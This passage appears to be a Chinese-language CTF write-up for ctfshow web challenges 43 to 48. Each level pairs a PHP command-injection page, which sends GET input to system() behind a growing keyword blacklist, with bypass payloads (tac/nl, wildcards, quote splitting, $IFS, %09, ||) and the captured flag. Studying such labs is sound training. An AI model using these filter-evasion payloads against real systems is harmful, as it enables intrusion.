important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 21:32:51</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>审计代码，过滤了cat和分号</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>more flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>sort flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>less flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tail flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>strings flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;38c4a65d-9e24-45ae-bb80-589f5e2fb4e4&#125;\n</code></pre>\n<h2 id=\"web44\"><a class=\"anchor\" href=\"#web44\">#</a> web44</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 21:32:01</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/;|cat|flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤了分号、cat、flag,通配符绕过即可\n\npayload\nc=tac f*||\nc=tac ????.???||\nc=tac fl\\ag.php||\nc=tac fl''ag.php||\nc=tac f*%0a\n</code></pre>\n<pre><code>ctfshow&#123;cf2310be-6e0a-45ce-a0bd-dd266236e994&#125;\n</code></pre>\n<h2 id=\"web45\"><a class=\"anchor\" href=\"#web45\">#</a> web45</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 21:35:34</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| /i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤了空格，空格绕过即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">></span><span class=\"token string backtick-quoted-string\">` `</span><span class=\"token operator\">&lt;</span><span class=\"token string backtick-quoted-string\">` `</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><span class=\"token string backtick-quoted-string\">` 重定向符</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>`</span><span class=\"token operator\">%</span><span class=\"token number\">09</span><span class=\"token string backtick-quoted-string\">`(需要php环境)</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>`</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span><span class=\"token string backtick-quoted-string\">`</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>`</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span class=\"token string backtick-quoted-string\">`</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>`</span><span class=\"token punctuation\">&#123;</span>cat<span class=\"token punctuation\">,</span>flag<span class=\"token operator\">.</span>php<span class=\"token punctuation\">&#125;</span><span class=\"token string backtick-quoted-string\">` //用逗号实现了空格功能</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>`</span><span class=\"token operator\">%</span><span class=\"token number\">20</span><span class=\"token string backtick-quoted-string\">`</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>`</span><span class=\"token operator\">%</span><span class=\"token number\">09</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">tac</span><span class=\"token variable\">$IFS</span><span class=\"token operator\">*</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">tac</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>f<span class=\"token operator\">*</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">tac</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9f</span><span class=\"token operator\">*</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">tac</span><span class=\"token variable\">$IFS</span><span class=\"token operator\">*</span><span class=\"token operator\">%</span><span class=\"token number\">0</span>A</pre></td></tr></table></figure><pre><code>ctfshow&#123;bc60f83a-81a0-48ba-9b2b-8d76432b5285&#125;\n</code></pre>\n<h2 id=\"web46\"><a class=\"anchor\" href=\"#web46\">#</a> web46</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 21:50:19</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤了<span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token number\">9</span>的数字、$、星号，重定向符绕过即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">></span><span class=\"token string backtick-quoted-string\">` `</span><span class=\"token operator\">&lt;</span><span class=\"token string backtick-quoted-string\">` `</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>` 重定向符</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">%</span><span class=\"token number\">09</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;7661bef9-e84e-473f-b781-312b85028f2c&#125;\n</code></pre>\n<h2 id=\"web47\"><a class=\"anchor\" href=\"#web47\">#</a> web47</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 21:59:23</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤了more、less、head、sort、tail，挑没过滤掉的使用即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">%</span><span class=\"token number\">09</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">%</span><span class=\"token number\">09</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">.</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">%</span><span class=\"token number\">09</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;2e100bbf-03eb-4936-8082-6fed00624a66&#125;\n</code></pre>\n<h2 id=\"web48\"><a class=\"anchor\" href=\"#web48\">#</a> web48</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:06:20</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤了sed、cut、awk、strings、od、curl、反单引号，挑没过滤掉的使用即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">%</span><span class=\"token number\">09</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;bb63b5ff-950f-4f4a-823d-a278496c21da&#125;\n</code></pre>\n<h2 